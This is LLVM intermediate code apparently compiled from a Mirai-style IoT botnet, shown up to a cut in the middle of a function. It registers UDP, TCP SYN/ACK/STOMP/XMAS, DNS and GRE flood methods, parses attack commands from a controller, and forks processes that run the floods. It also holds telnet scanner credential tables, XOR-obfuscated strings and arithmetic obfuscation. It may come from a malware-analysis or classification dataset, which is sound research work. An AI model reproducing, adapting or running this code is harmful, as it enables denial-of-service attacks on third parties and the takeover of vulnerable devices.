; ModuleID = 'host/ir_sub/Katrina.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.scanner_connection = type { %struct.scanner_auth*, i32, i32, i32, i32, i16, i32, [256 x i8], i8 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }
%struct.fd_set.18 = type { [16 x i64] }
%struct.timeval.19 = type { i64, i64 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [15 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@scanner_pid = common global i32 0, align 4
@fake_time = global i32 0, align 4
@conn_table = common global %struct.scanner_connection* null, align 8
@rsck = common global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str = private unnamed_addr constant [4 x i8] c"\05\0E\09\00", align 1
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"\03\06\02\0A\08\09\00", align 1
@.str.3 = private unnamed_addr constant [8 x i8] c"\03\02\01\06\12\0B\13\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"4U\01 \16)!\14\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"(\1F\0F\0B\104 _\00", align 1
@.str.6 = private unnamed_addr constant [8 x i8] c"\12\14\12\06\15\0E\08\00", align 1
@.str.7 = private unnamed_addr constant [5 x i8] c"\15\08\08\13\00", align 1
@.str.8 = private unnamed_addr constant [14 x i8] c"+4\0E\12>P\17(\0A= U\14\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"\06\03\0A\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"\06\03\0A\0E\09\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"\04\06\13VWU^\00", align 1
@.str.12 = private unnamed_addr constant [13 x i8] c"\11\14\13\06\15\04\06\0AUWVR\00", align 1
@.str.13 = private unnamed_addr constant [9 x i8] c"UWVRWQWU\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.15 = private unnamed_addr constant [8 x i8] c"0.0.0.0\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = global i16 0, align 2
@auth_table_len = global i32 0, align 4
@auth_table = global %struct.scanner_auth* null, align 8
@table = common global [31 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -554828881, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpgeneric)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpvse)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpdns)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpsyn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstomp)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpxmas)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greip)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greeth)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_std)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = sub i32 %17, 656188783
  %19 = add i32 %18, 1
  %20 = add i32 %19, 656188783
  %21 = add nsw i32 %17, 1
  %22 = sext i32 %20 to i64
  %23 = mul i64 %22, 8
  %24 = call i8* @realloc(i8* %15, i64 %23) #6
  %25 = bitcast i8* %24 to %struct.attack_method**
  store %struct.attack_method** %25, %struct.attack_method*** @methods, align 8
  %26 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %27 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %28 = load i8, i8* @methods_len, align 1
  %29 = add i8 %28, 35
  %30 = add i8 %29, 1
  %31 = sub i8 %30, 35
  %32 = add i8 %28, 1
  store i8 %31, i8* @methods_len, align 1
  %33 = zext i8 %28 to i64
  %34 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %27, i64 %33
  store %struct.attack_method* %26, %struct.attack_method** %34, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %21, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 15
  br i1 %4, label %5, label %26

; <label>:5:                                      ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %7
  %9 = load i32, i32* %8, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %5
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %13
  %15 = load i32, i32* %14, align 4
  %16 = call i32 @kill(i32 %15, i32 9) #6
  br label %17

; <label>:17:                                     ; preds = %11, %5
  %18 = load i32, i32* %1, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %19
  store i32 0, i32* %20, align 4
  br label %21

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %1, align 4
  %23 = sub i32 0, 1
  %24 = sub i32 %22, %23
  %25 = add nsw i32 %22, 1
  store i32 %24, i32* %1, align 4
  br label %2

; <label>:26:                                     ; preds = %2
  call void (...) bitcast (void ()* @scanner_init to void (...)*)()
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %254

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = add i64 %25, 5268825109027471570
  %27 = sub i64 %26, 4
  %28 = sub i64 %27, 5268825109027471570
  %29 = sub i64 %25, 4
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %4, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %17
  br label %254

; <label>:34:                                     ; preds = %17
  %35 = load i8*, i8** %3, align 8
  %36 = getelementptr inbounds i8, i8* %35, i32 1
  store i8* %36, i8** %3, align 8
  %37 = load i8, i8* %35, align 1
  store i8 %37, i8* %7, align 1
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = sub i64 %39, 2328685490136720548
  %41 = sub i64 %40, 1
  %42 = add i64 %41, 2328685490136720548
  %43 = sub i64 %39, 1
  %44 = trunc i64 %42 to i32
  store i32 %44, i32* %4, align 4
  %45 = load i32, i32* %4, align 4
  %46 = icmp eq i32 %45, 0
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %34
  br label %254

; <label>:48:                                     ; preds = %34
  %49 = load i8*, i8** %3, align 8
  %50 = getelementptr inbounds i8, i8* %49, i32 1
  store i8* %50, i8** %3, align 8
  %51 = load i8, i8* %49, align 1
  store i8 %51, i8* %8, align 1
  %52 = load i32, i32* %4, align 4
  %53 = sext i32 %52 to i64
  %54 = sub i64 %53, -6166698952390139154
  %55 = sub i64 %54, 1
  %56 = add i64 %55, -6166698952390139154
  %57 = sub i64 %53, 1
  %58 = trunc i64 %56 to i32
  store i32 %58, i32* %4, align 4
  %59 = load i8, i8* %8, align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %62, label %63

; <label>:62:                                     ; preds = %48
  br label %254

; <label>:63:                                     ; preds = %48
  %64 = load i32, i32* %4, align 4
  %65 = sext i32 %64 to i64
  %66 = load i8, i8* %8, align 1
  %67 = zext i8 %66 to i64
  %68 = mul i64 5, %67
  %69 = icmp ult i64 %65, %68
  br i1 %69, label %70, label %71

; <label>:70:                                     ; preds = %63
  br label %254

; <label>:71:                                     ; preds = %63
  %72 = load i8, i8* %8, align 1
  %73 = zext i8 %72 to i64
  %74 = call noalias i8* @calloc(i64 %73, i64 24) #6
  %75 = bitcast i8* %74 to %struct.attack_target*
  store %struct.attack_target* %75, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %76

; <label>:76:                                     ; preds = %126, %71
  %77 = load i32, i32* %5, align 4
  %78 = load i8, i8* %8, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp slt i32 %77, %79
  br i1 %80, label %81, label %133

; <label>:81:                                     ; preds = %76
  %82 = load i8*, i8** %3, align 8
  %83 = bitcast i8* %82 to i32*
  %84 = load i32, i32* %83, align 4
  %85 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %86 = load i32, i32* %5, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i64 %87
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %88, i32 0, i32 1
  store i32 %84, i32* %89, align 4
  %90 = load i8*, i8** %3, align 8
  %91 = getelementptr inbounds i8, i8* %90, i64 4
  store i8* %91, i8** %3, align 8
  %92 = load i8*, i8** %3, align 8
  %93 = getelementptr inbounds i8, i8* %92, i32 1
  store i8* %93, i8** %3, align 8
  %94 = load i8, i8* %92, align 1
  %95 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i64 %97
  %99 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %98, i32 0, i32 2
  store i8 %94, i8* %99, align 4
  %100 = load i32, i32* %4, align 4
  %101 = sext i32 %100 to i64
  %102 = add i64 %101, 2328383524983442162
  %103 = sub i64 %102, 5
  %104 = sub i64 %103, 2328383524983442162
  %105 = sub i64 %101, 5
  %106 = trunc i64 %104 to i32
  store i32 %106, i32* %4, align 4
  %107 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 0
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %111, i32 0, i32 0
  store i16 2, i16* %112, align 4
  %113 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %114 = load i32, i32* %5, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %113, i64 %115
  %117 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %116, i32 0, i32 1
  %118 = load i32, i32* %117, align 4
  %119 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %120 = load i32, i32* %5, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %119, i64 %121
  %123 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %122, i32 0, i32 0
  %124 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %123, i32 0, i32 2
  %125 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %124, i32 0, i32 0
  store i32 %118, i32* %125, align 4
  br label %126

; <label>:126:                                    ; preds = %81
  %127 = load i32, i32* %5, align 4
  %128 = sub i32 0, %127
  %129 = sub i32 0, 1
  %130 = add i32 %128, %129
  %131 = sub i32 0, %130
  %132 = add nsw i32 %127, 1
  store i32 %131, i32* %5, align 4
  br label %76

; <label>:133:                                    ; preds = %76
  %134 = load i32, i32* %4, align 4
  %135 = sext i32 %134 to i64
  %136 = icmp ult i64 %135, 1
  br i1 %136, label %137, label %138

; <label>:137:                                    ; preds = %133
  br label %254

; <label>:138:                                    ; preds = %133
  %139 = load i8*, i8** %3, align 8
  %140 = getelementptr inbounds i8, i8* %139, i32 1
  store i8* %140, i8** %3, align 8
  %141 = load i8, i8* %139, align 1
  store i8 %141, i8* %9, align 1
  %142 = load i32, i32* %4, align 4
  %143 = sext i32 %142 to i64
  %144 = sub i64 %143, -6091218364583392719
  %145 = sub i64 %144, 1
  %146 = add i64 %145, -6091218364583392719
  %147 = sub i64 %143, 1
  %148 = trunc i64 %146 to i32
  store i32 %148, i32* %4, align 4
  %149 = load i8, i8* %9, align 1
  %150 = zext i8 %149 to i32
  %151 = icmp sgt i32 %150, 0
  br i1 %151, label %152, label %246

; <label>:152:                                    ; preds = %138
  %153 = load i8, i8* %9, align 1
  %154 = zext i8 %153 to i64
  %155 = call noalias i8* @calloc(i64 %154, i64 16) #6
  %156 = bitcast i8* %155 to %struct.attack_option*
  store %struct.attack_option* %156, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %157

; <label>:157:                                    ; preds = %238, %152
  %158 = load i32, i32* %5, align 4
  %159 = load i8, i8* %9, align 1
  %160 = zext i8 %159 to i32
  %161 = icmp slt i32 %158, %160
  br i1 %161, label %162, label %245

; <label>:162:                                    ; preds = %157
  %163 = load i32, i32* %4, align 4
  %164 = sext i32 %163 to i64
  %165 = icmp ult i64 %164, 1
  br i1 %165, label %166, label %167

; <label>:166:                                    ; preds = %162
  br label %254

; <label>:167:                                    ; preds = %162
  %168 = load i8*, i8** %3, align 8
  %169 = getelementptr inbounds i8, i8* %168, i32 1
  store i8* %169, i8** %3, align 8
  %170 = load i8, i8* %168, align 1
  %171 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %172 = load i32, i32* %5, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %171, i64 %173
  %175 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %174, i32 0, i32 1
  store i8 %170, i8* %175, align 8
  %176 = load i32, i32* %4, align 4
  %177 = sext i32 %176 to i64
  %178 = sub i64 0, 1
  %179 = add i64 %177, %178
  %180 = sub i64 %177, 1
  %181 = trunc i64 %179 to i32
  store i32 %181, i32* %4, align 4
  %182 = load i32, i32* %4, align 4
  %183 = sext i32 %182 to i64
  %184 = icmp ult i64 %183, 1
  br i1 %184, label %185, label %186

; <label>:185:                                    ; preds = %167
  br label %254

; <label>:186:                                    ; preds = %167
  %187 = load i8*, i8** %3, align 8
  %188 = getelementptr inbounds i8, i8* %187, i32 1
  store i8* %188, i8** %3, align 8
  %189 = load i8, i8* %187, align 1
  store i8 %189, i8* %12, align 1
  %190 = load i32, i32* %4, align 4
  %191 = sext i32 %190 to i64
  %192 = sub i64 %191, -6353746480878130643
  %193 = sub i64 %192, 1
  %194 = add i64 %193, -6353746480878130643
  %195 = sub i64 %191, 1
  %196 = trunc i64 %194 to i32
  store i32 %196, i32* %4, align 4
  %197 = load i32, i32* %4, align 4
  %198 = load i8, i8* %12, align 1
  %199 = zext i8 %198 to i32
  %200 = icmp slt i32 %197, %199
  br i1 %200, label %201, label %202

; <label>:201:                                    ; preds = %186
  br label %254

; <label>:202:                                    ; preds = %186
  %203 = load i8, i8* %12, align 1
  %204 = zext i8 %203 to i32
  %205 = sub i32 0, %204
  %206 = sub i32 0, 1
  %207 = add i32 %205, %206
  %208 = sub i32 0, %207
  %209 = add nsw i32 %204, 1
  %210 = sext i32 %208 to i64
  %211 = call noalias i8* @calloc(i64 %210, i64 1) #6
  %212 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %213 = load i32, i32* %5, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %212, i64 %214
  %216 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %215, i32 0, i32 0
  store i8* %211, i8** %216, align 8
  %217 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %218 = load i32, i32* %5, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %217, i64 %219
  %221 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %220, i32 0, i32 0
  %222 = load i8*, i8** %221, align 8
  %223 = load i8*, i8** %3, align 8
  %224 = load i8, i8* %12, align 1
  %225 = zext i8 %224 to i32
  call void @util_memcpy(i8* %222, i8* %223, i32 %225)
  %226 = load i8, i8* %12, align 1
  %227 = zext i8 %226 to i32
  %228 = load i8*, i8** %3, align 8
  %229 = sext i32 %227 to i64
  %230 = getelementptr inbounds i8, i8* %228, i64 %229
  store i8* %230, i8** %3, align 8
  %231 = load i8, i8* %12, align 1
  %232 = zext i8 %231 to i32
  %233 = load i32, i32* %4, align 4
  %234 = add i32 %233, -110418332
  %235 = sub i32 %234, %232
  %236 = sub i32 %235, -110418332
  %237 = sub nsw i32 %233, %232
  store i32 %236, i32* %4, align 4
  br label %238

; <label>:238:                                    ; preds = %202
  %239 = load i32, i32* %5, align 4
  %240 = sub i32 0, %239
  %241 = sub i32 0, 1
  %242 = add i32 %240, %241
  %243 = sub i32 0, %242
  %244 = add nsw i32 %239, 1
  store i32 %243, i32* %5, align 4
  br label %157

; <label>:245:                                    ; preds = %157
  br label %246

; <label>:246:                                    ; preds = %245, %138
  %247 = call i32* @__errno_location() #7
  store i32 0, i32* %247, align 4
  %248 = load i32, i32* %6, align 4
  %249 = load i8, i8* %7, align 1
  %250 = load i8, i8* %8, align 1
  %251 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %252 = load i8, i8* %9, align 1
  %253 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %248, i8 zeroext %249, i8 zeroext %250, %struct.attack_target* %251, i8 zeroext %252, %struct.attack_option* %253)
  br label %254

; <label>:254:                                    ; preds = %246, %201, %185, %166, %137, %70, %62, %47, %33, %16
  %255 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %256 = icmp ne %struct.attack_target* %255, null
  br i1 %256, label %257, label %260

; <label>:257:                                    ; preds = %254
  %258 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %259 = bitcast %struct.attack_target* %258 to i8*
  call void @free(i8* %259) #6
  br label %260

; <label>:260:                                    ; preds = %257, %254
  %261 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %262 = icmp ne %struct.attack_option* %261, null
  br i1 %262, label %263, label %267

; <label>:263:                                    ; preds = %260
  %264 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %265 = load i8, i8* %9, align 1
  %266 = zext i8 %265 to i32
  call void @free_opts(%struct.attack_option* %264, i32 %266)
  br label %267

; <label>:267:                                    ; preds = %263, %260
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #6
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %22, label %19

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* %13, align 4
  %21 = icmp sgt i32 %20, 0
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19, %6
  ret void

; <label>:23:                                     ; preds = %19
  %24 = call i32 @fork() #6
  store i32 %24, i32* %14, align 4
  %25 = load i32, i32* %14, align 4
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %28

; <label>:27:                                     ; preds = %23
  call void @exit(i32 0) #8
  unreachable

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* %14, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %36

; <label>:31:                                     ; preds = %28
  %32 = load i32, i32* %7, align 4
  %33 = call i32 @sleep(i32 %32)
  %34 = call i32 @getppid() #6
  %35 = call i32 @kill(i32 %34, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:36:                                     ; preds = %28
  store i32 0, i32* %15, align 4
  br label %37

; <label>:37:                                     ; preds = %67, %36
  %38 = load i32, i32* %15, align 4
  %39 = load i8, i8* @methods_len, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp slt i32 %38, %40
  br i1 %41, label %42, label %73

; <label>:42:                                     ; preds = %37
  %43 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %44 = load i32, i32* %15, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %43, i64 %45
  %47 = load %struct.attack_method*, %struct.attack_method** %46, align 8
  %48 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %47, i32 0, i32 1
  %49 = load i8, i8* %48, align 8
  %50 = zext i8 %49 to i32
  %51 = load i8, i8* %8, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %50, %52
  br i1 %53, label %54, label %66

; <label>:54:                                     ; preds = %42
  %55 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %56 = load i32, i32* %15, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %55, i64 %57
  %59 = load %struct.attack_method*, %struct.attack_method** %58, align 8
  %60 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %59, i32 0, i32 0
  %61 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %60, align 8
  %62 = load i8, i8* %9, align 1
  %63 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %64 = load i8, i8* %11, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %61(i8 zeroext %62, %struct.attack_target* %63, i8 zeroext %64, %struct.attack_option* %65)
  br label %73

; <label>:66:                                     ; preds = %42
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* %15, align 4
  %69 = sub i32 %68, 932929385
  %70 = add i32 %69, 1
  %71 = add i32 %70, 932929385
  %72 = add nsw i32 %68, 1
  store i32 %71, i32* %15, align 4
  br label %37

; <label>:73:                                     ; preds = %54, %37
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %39

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %36

; <label>:14:                                     ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* %28) #6
  br label %29

; <label>:29:                                     ; preds = %22, %14
  br label %30

; <label>:30:                                     ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = add i32 %31, -183220138
  %33 = add i32 %32, 1
  %34 = sub i32 %33, -183220138
  %35 = add nsw i32 %31, 1
  store i32 %34, i32* %5, align 4
  br label %10

; <label>:36:                                     ; preds = %10
  %37 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %38 = bitcast %struct.attack_option* %37 to i8*
  call void @free(i8* %38) #6
  br label %39

; <label>:39:                                     ; preds = %36, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #3

declare i32 @sleep(i32) #4

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
